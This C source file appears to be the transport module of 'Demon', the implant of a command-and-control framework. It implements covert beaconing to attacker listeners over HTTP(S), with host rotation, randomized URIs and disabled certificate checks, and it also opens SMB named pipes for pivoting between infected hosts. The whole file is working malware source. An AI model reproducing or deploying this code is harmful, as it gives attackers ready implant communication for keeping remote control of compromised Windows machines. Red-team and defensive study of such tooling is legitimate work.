#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Package.h>
#include <Core/Transport.h>
#include <Core/MiniStd.h>

#include <Crypt/AesCrypt.h>

BOOL TransportInit( )
{
    PUTS( "Connecting to listener" )
    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

    /* Sends to our connection (direct/pivot) */
#ifdef TRANSPORT_HTTP
    if ( PackageTransmit( Instance.MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };

        /* Decrypt what we got */
        AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Data, Size );

        if ( Data )
        {
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
#endif

#ifdef TRANSPORT_SMB
    if ( PackageTransmit( Instance.MetaData, NULL, NULL ) == TRUE )
    {
        Instance.Session.Connected = TRUE;
        Success = TRUE;
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
#ifdef TRANSPORT_HTTP
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;

    LPWSTR  HttpHost        = NULL;
    LPWSTR  HttpHeader      = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;

    DWORD   Counter         = 0;
    DWORD   Iterator        = 0;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = TRUE;

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        HttpAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        HttpProxy      = Instance.Config.Transport.Proxy.Url;
    }

    hSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( ! hSession )
    {
        PRINTF( "WinHttpOpen: Failed => %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

    /*
     * TODO: PLEASE REWRITE THIS. THIS IS NOT HOW IT SHOULD BE DONE.
     * Just noticed that it shouldn't do it for every request.
     * TODO: create a HOST_DATA linked list with domain + port.
     *       1. Try to send our data to it. if its fails we increment our Failed Counter
     *       2. Check if we reached our failed max counter and if yes flag the current host as dead and use the next one.
     *       3. Repeat til we dont have any living hosts anymore.
     *          After that we can exit cuz seems that our infra isnt alive anymore and we kinda wanna avoid being a ghost beacon.
     * */
    if ( Instance.Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        HttpHost = Instance.Config.Transport.Hosts[ Instance.Config.Transport.HostIndex ];
        if ( HttpHost )
            Instance.Config.Transport.HostIndex++;
        else
        {
            // We hit the last item which is a NULL. means we have to start all over from 0.
            Instance.Config.Transport.HostIndex = 0;
            HttpHost = Instance.Config.Transport.Hosts[ Instance.Config.Transport.HostIndex ];
        }
    }
    else if ( Instance.Config.Transport.HostRotation == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        while ( TRUE )
        {
            if ( ! Instance.Config.Transport.Hosts[ Counter ] ) break;
            else Counter++;
        }

        HttpHost = Instance.Config.Transport.Hosts[ RandomNumber32() % Counter ];
    }

    hConnect = Instance.Win32.WinHttpConnect( hSession, HttpHost, Instance.Config.Transport.Port, 0 );
    if ( ! hConnect )
    {
        PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        Successful = FALSE;
        goto LEAVE;
    }

    Counter = 0;
    while ( TRUE )
    {
        if ( ! Instance.Config.Transport.Uris[ Counter ] ) break;
        else Counter++;
    }

    HttpEndpoint = Instance.Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure )
        HttpFlags |= WINHTTP_FLAG_SECURE;

    hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, Instance.Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    if ( ! hRequest )
    {
        PRINTF( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    do
    {
        HttpHeader = Instance.Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        Instance.Win32.WinHttpAddRequestHeaders( hRequest, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );

        Iterator++;
    } while ( TRUE );

    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        WINHTTP_PROXY_INFO ProxyInfo = { 0 };

        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance.Config.Transport.Proxy.Url;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) )
        {
            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance.Config.Transport.Proxy.Username )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_USERNAME, Instance.Config.Transport.Proxy.Username, StringLengthW( Instance.Config.Transport.Proxy.Username ) ) )
            {
                PRINTF( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance.Config.Transport.Proxy.Password )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_USERNAME, Instance.Config.Transport.Proxy.Password, StringLengthW( Instance.Config.Transport.Proxy.Password ) ) )
            {
                PRINTF( "Failed to set proxy password %u", NtGetLastError() );
            }
        }
    }

    // Send our data
    if ( Instance.Win32.WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
    {
        if ( RecvData && Instance.Win32.WinHttpReceiveResponse( hRequest, NULL ) )
        {
            RespBuffer = NULL;
            do
            {
                Successful = Instance.Win32.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                if ( ! Successful || BufRead == 0 )
                {
                    break;
                }

                if ( ! RespBuffer )
                    RespBuffer = Instance.Win32.LocalAlloc( LPTR, BufRead );
                else
                    RespBuffer = Instance.Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                RespSize += BufRead;

                MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                MemSet( Buffer, 0, 1024 );

            } while ( Successful == TRUE );

            if ( RecvSize )
                *RecvSize = RespSize;

            if ( RecvData )
                *RecvData = RespBuffer;

            Successful = TRUE;
        }
    }
    else
    {
        if ( NtGetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;

        PRINTF( "HTTP Error: %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

LEAVE:
    Instance.Win32.WinHttpCloseHandle( hSession );
    Instance.Win32.WinHttpCloseHandle( hConnect );
    Instance.Win32.WinHttpCloseHandle( hRequest );

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    return Successful;
#endif

#ifdef TRANSPORT_SMB
    if ( ! Instance.Config.Transport.Handle )
    {
        // PRINTF( "Create Named Pipe Server => %s\n", Instance.Config.Transport.Name )

        Instance.Config.Transport.Handle = Instance.Win32.CreateNamedPipeW( Instance.Config.Transport.Name,  // Named Pipe
                                                                              PIPE_ACCESS_DUPLEX,               // read/write access
                                                                              PIPE_TYPE_MESSAGE     |           // message type pipe
                                                                              PIPE_READMODE_MESSAGE |           // message-read mode
                                                                              PIPE_WAIT,                        // blocking mode
                                                                              PIPE_UNLIMITED_INSTANCES,         // max. instances
                                                                              0x10000,                          // output buffer size
                                                                              0x10000,                          // input buffer size
                                                                              0,                                // client time-out
                                                                              NULL );

        // PRINTF( "SMB Handle => %x\n", Instance.Config.Transport.Handle )
        if ( ! Instance.Config.Transport.Handle )
        {
            //  PRINTF( "CreateNamedPipe: Failed[%d]\n", NtGetLastError() );
            return NULL;
        }

        if ( ! Instance.Win32.ConnectNamedPipe( Instance.Config.Transport.Handle, NULL ) )
        {
            // PRINTF( "ConnectNamedPipe: Failed[%d]\n", NtGetLastError() );
            Instance.Win32.NtClose( Instance.Config.Transport.Handle );
            return FALSE;
        }
        else
        {
            // PUTS( "Client connected" );
        }

        if ( ! Instance.Win32.WriteFile( Instance.Config.Transport.Handle, Data, Size, &Size, NULL ) )
        {
            // PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
            return FALSE;
        }
        else
        {
            //  PRINTF( "Successful wrote demon data : %d\n", Size )
            return TRUE;
        }

    }
    else
    {
        BOOL Success = FALSE;

        Success = Instance.Win32.WriteFile( Instance.Config.Transport.Handle, Data, Size, &Size, NULL );

        if ( ! Success )
        {
            // Means that the client disconnected/the pipe is closing.
            if ( NtGetLastError() == ERROR_NO_DATA )
            {
                if ( Instance.Config.Transport.Handle )
                {
                    Instance.Win32.NtClose( Instance.Config.Transport.Handle );
                    Instance.Config.Transport.Handle = NULL;
                }

                Instance.Session.Connected = FALSE;
            }

            PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );
        }

        if ( RecvData )
            *RecvData = TransportRecv( RecvSize );

        return Success;
    }
#endif
}

#ifdef TRANSPORT_SMB
PVOID TransportRecv( PSIZE_T Size )
{
    PVOID Response    = NULL;
    DWORD BytesSize   = 0;
    DWORD DemonId     = 0;
    DWORD PackageSize = 0;

    if ( Instance.Win32.PeekNamedPipe( Instance.Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
    {
        if ( BytesSize > sizeof( UINT32 ) )
        {
            if ( Instance.Win32.PeekNamedPipe( Instance.Config.Transport.Handle, &DemonId, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
            {
                if ( Instance.Session.AgentID != DemonId )
                {
                    *Size = 0;
                    return NULL;
                }

                Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL );
            }

            Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL );

            Response = Instance.Win32.LocalAlloc( LPTR, PackageSize );
            if ( Instance.Win32.ReadFile( Instance.Config.Transport.Handle, Response, PackageSize, &BytesSize, NULL ) )
            {
                if ( Size )
                    *Size = BytesSize;

                return Response;
            }
        }
    }
    else
    {
        if ( NtGetLastError() == ERROR_BROKEN_PIPE )
        {
            // PUTS( "Client disconnected" )
            Instance.Session.Connected = FALSE;
            return NULL;
        }
        // PRINTF( "Couldn't peek named pipe: %d\n", NtGetLastError() )
    }

    return Response;
}
#endif
